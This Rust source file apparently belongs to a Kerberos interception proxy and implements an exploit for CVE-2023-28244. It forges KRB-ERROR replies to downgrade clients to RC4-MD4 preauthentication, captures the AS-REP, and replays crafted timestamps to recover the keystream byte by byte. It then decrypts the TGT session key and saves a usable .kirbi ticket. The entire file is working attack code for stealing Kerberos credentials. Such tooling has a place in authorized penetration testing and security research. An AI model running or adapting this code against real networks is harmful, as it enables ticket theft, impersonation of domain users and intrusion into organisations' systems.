use std::{
    net::SocketAddr,
    path::{Path, PathBuf},
};

use bytes::Bytes;
use chrono::Utc;
use kile::{
    constants::{
        ETYPE_AES128_CTS_HMAC_SHA1_96, ETYPE_RC4_MD4, KDC_ERR_PREAUTH_FAILED, KRB_ERR_GENERIC,
        PA_ENC_TIMESTAMP, PA_PAC_REQUEST,
    },
    crypt::rc4_md4::{self, EncryptedTimestamp},
    structures::{AsRepExt, AsReqExt, HostAddressExt, KrbErrorExt},
    KdcClient, KdcFrame,
};
use rasn::der;
use rasn_kerberos::{
    AsRep, AsReq, EncryptedData, EncryptionKey, HostAddress, KdcOptions, KerberosFlags, KrbError,
    PaData,
};
use tokio::sync::mpsc::{self, Receiver, Sender};
use tracing::{debug, error, info};

use super::{Handler, HandlerAction};

/// Handler that attempts to downgrade AS-REQ preauth to RC4-MD4 cipher and crack TGT session key
/// per CVE-2023-28244
#[derive(Clone)]
pub struct Cve202328244Handler {
    tx: Sender<AsRep>,
}

impl Cve202328244Handler {
    // TODO: Use address field from the initial AS-REQ?
    const CLIENT_NETBIOS_NAME: &'static str = "WORKSTATION";

    pub fn new(remote_addr: SocketAddr, output_dir: PathBuf) -> Self {
        let (tx, rx) = mpsc::channel::<AsRep>(100);
        tokio::spawn(Self::replay_task(rx, remote_addr, output_dir));
        Self { tx }
    }

    async fn replay_task(mut rx: Receiver<AsRep>, remote_addr: SocketAddr, output_dir: PathBuf) {
        info!("Started CVE-2023-28244 replay task, waiting for AS-REPs...");
        while let Some(as_rep) = rx.recv().await {
            // Double-check that parameters are valid for exploit
            if as_rep.0.enc_part.etype != ETYPE_RC4_MD4 {
                error!("AS-REP fields are not valid for exploit, skipping");
                continue;
            }
            // Do the replay attack stuff...
            info!("Attempting to roast TGT session key!");
            let mut keystream = rc4_md4::Keystream::from_as_rep(&as_rep).unwrap();
            // TODO: Handle tokio connect errors
            let mut client = KdcClient::connect(remote_addr).await.unwrap();
            while keystream.len() < 61 {
                for (enc_ts, last_byte) in EncryptedTimestamp::iter_last_byte(&keystream) {
                    let as_req = AsReq::builder()
                        .with_padata(PaData {
                            r#type: PA_ENC_TIMESTAMP,
                            value: der::encode(&EncryptedData {
                                etype: ETYPE_RC4_MD4,
                                kvno: None,
                                cipher: enc_ts.into(),
                            })
                            .unwrap()
                            .into(),
                        })
                        .with_padata(PaData {
                            r#type: PA_PAC_REQUEST,
                            value: b"\x30\x05\xa0\x03\x01\x01\xff".as_ref().into(),
                        })
                        .kdc_options(KdcOptions(KerberosFlags::from_slice(b"\x40\x81\x00\x10")))
                        .cname(as_rep.0.cname.clone())
                        .realm(as_rep.0.ticket.realm.clone())
                        .etype(vec![ETYPE_AES128_CTS_HMAC_SHA1_96])
                        // TODO: Use address field from the initial AS-REQ?
                        // .with_address(HostAddress {
                        //     addr_type: HostAddress::NET_BIOS,
                        //     address: Self::CLIENT_NETBIOS_NAME.into(),
                        // })
                        .with_address(HostAddress::netbios(Self::CLIENT_NETBIOS_NAME).unwrap())
                        .build();
                    // TODO: Handle tokio errors
                    match client.send_as_req(as_req).await.unwrap() {
                        KdcFrame::KrbError(krb_error)
                            if krb_error.error_code == KRB_ERR_GENERIC =>
                        {
                            // ERR_GENERIC (60) means timestamp did not deserialize correctly
                            // so the last keystream byte is incorrect - keep trying
                            ()
                        }
                        KdcFrame::AsRep(_) => {
                            // Our last byte is correct
                            let i = keystream.len();
                            debug!("keystream[{i}] = {last_byte:#04x?}");
                            keystream.push(last_byte);
                            break;
                        }
                        KdcFrame::KrbError(krb_error)
                            if krb_error.error_code == KDC_ERR_PREAUTH_FAILED =>
                        {
                            error!("Something is wrong with the keystream, stopping");
                            return;
                        }
                        _ => {
                            error!("Received unexpected KRB-ERROR message, stopping");
                            return;
                        }
                    }
                }
            }
            let mut buf = as_rep.0.enc_part.cipher[..61].to_vec();
            keystream.apply(&mut buf);
            let session_key = EncryptionKey {
                r#type: ETYPE_AES128_CTS_HMAC_SHA1_96,
                value: Bytes::copy_from_slice(&buf[45..61]),
            };
            info!("Decrypted TGT Session Key: {:016x}", &session_key.value);
            // TODO: Save RC4-MD4 keystream (1:1 correspondence to NT password)
            let filename = format!(
                "{}_{}.kirbi",
                Utc::now().format("%Y%m%dT%H%M%S"),
                as_rep.get_cname()
            );
            let path = &Path::join(&output_dir, filename);
            match std::fs::create_dir_all(&output_dir) {
                Ok(_) => (),
                Err(_) => {
                    error!("Failed to create output directory {:#?}", &output_dir);
                    return;
                }
            }
            match kile::fs::write_tgt_to_kirbi(as_rep, session_key, path) {
                Ok(_) => info!("Wrote TGT to {:#?}", path),
                Err(e) => error!("Failed to write .kirbi file: {:?}", e),
            }
        }
    }
}

impl Handler for Cve202328244Handler {
    fn name(&self) -> &'static str {
        "CVE-2023-28244"
    }

    fn handle_downstream(&mut self, frame: KdcFrame) -> HandlerAction {
        match &frame {
            KdcFrame::AsReq(as_req) => match as_req.get_pa_etype() {
                Some(ETYPE_RC4_MD4) => {
                    info!("Received AS-REQ with RC4-MD4 preauth, modifying body ETYPEs and forwarding to KDC...");
                    let mut as_req = as_req.clone().replace_etypes(ETYPE_AES128_CTS_HMAC_SHA1_96);
                    // Add a host address field to make sure the plaintext is long enough
                    as_req.0.req_body.addresses =
                        //Some(vec![HostAddress::netbios("WORKSTATION").unwrap()]);
                        Some(vec![HostAddress::netbios(Self::CLIENT_NETBIOS_NAME).unwrap()]);
                    HandlerAction::Forward(KdcFrame::AsReq(as_req))
                }
                Some(_) => {
                    info!("Received AS-REQ with unwanted preauth etype, forging KRB-ERROR...");
                    let realm = as_req.get_realm().to_owned();
                    let reply = KrbError::new_preauth_required(realm, ETYPE_RC4_MD4);
                    HandlerAction::DropAndReplyWith(KdcFrame::KrbError(reply))
                }
                None => {
                    info!("Received AS-REQ without preauth, forging KRB-ERROR...");
                    let realm = as_req.get_realm().to_owned();
                    let reply = KrbError::new_preauth_required(realm, ETYPE_RC4_MD4);
                    HandlerAction::DropAndReplyWith(KdcFrame::KrbError(reply))
                }
            },
            _ => HandlerAction::Forward(frame),
        }
    }

    fn handle_upstream(&mut self, frame: KdcFrame) -> HandlerAction {
        match &frame {
            KdcFrame::AsRep(as_rep) => {
                match as_rep.0.enc_part.etype {
                    ETYPE_RC4_MD4 => {
                        // Save AS_REP for session key roasting
                        match futures::executor::block_on(self.tx.send(as_rep.to_owned())) {
                            Ok(_) => (),
                            Err(e) => error!("Tokio channel error: {:?}", e),
                        }
                    }
                    _ => (),
                }
                HandlerAction::Forward(frame)
            }
            _ => HandlerAction::Forward(frame),
        }
    }
}
